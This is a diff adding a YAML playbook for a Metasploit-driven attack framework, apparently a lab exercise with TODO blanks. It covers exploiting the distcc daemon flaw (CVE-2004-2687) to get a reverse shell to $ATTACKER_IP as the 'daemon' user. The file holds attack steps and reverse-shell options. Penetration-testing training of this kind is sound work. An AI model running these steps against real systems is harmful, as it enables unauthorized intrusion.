@@ -1,0 +1,46 @@
+# Phase 4: Initial Access - distcc Daemon RCE (CVE-2004-2687)
+#
+# Background: distcc distributes compilation jobs across a network. Without
+# access controls (the default), any host can submit a "job". The distcc_exec
+# module injects shell commands in place of compiler arguments, which distcc
+# executes as the daemon user.
+#
+# Result:     Shell session as 'daemon' user (privilege escalation required)
+# Variables required: $TARGET, $ATTACKER_IP, $LPORT
+# Variables set:      $SESSION_NAME, $LAST_MSF_SESSION
+# ATT&CK: T1190 (Exploit Public-Facing Application)
+
+commands:
+  - type: debug
+    cmd: "Attempting distcc RCE against $TARGET port 3632..."
+
+  # TODO: Run the distcc exploit module.
+  # Fill in the module name (cmd), the target port (RPORT), and payload details.
+  # Hint: go into msfconsole and search for distcc to find the module and compatible payloads.
+  - type: msf-module
+    cmd: # TODO: module path
+    creates_session: distcc_shell
+    payload: # TODO: reverse shell payload
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: $LPORT
+    options:
+      RHOSTS: $TARGET
+      RPORT: # TODO: distcc port number
+    metadata:
+      tactic: "TA0001"
+      technique: "T1190"
+      technique_name: "Exploit Public-Facing Application"
+
+  # Confirm the shell (expect: uid=1 / daemon)
+  - type: msf-session
+    session: distcc_shell
+    cmd: id
+
+  # Store the session name for subsequent includes
+  - type: setvar
+    variable: SESSION_NAME
+    cmd: distcc_shell
+
+  - type: debug
+    cmd: "distcc shell established as: $RESULT_STDOUT. Privilege escalation required."
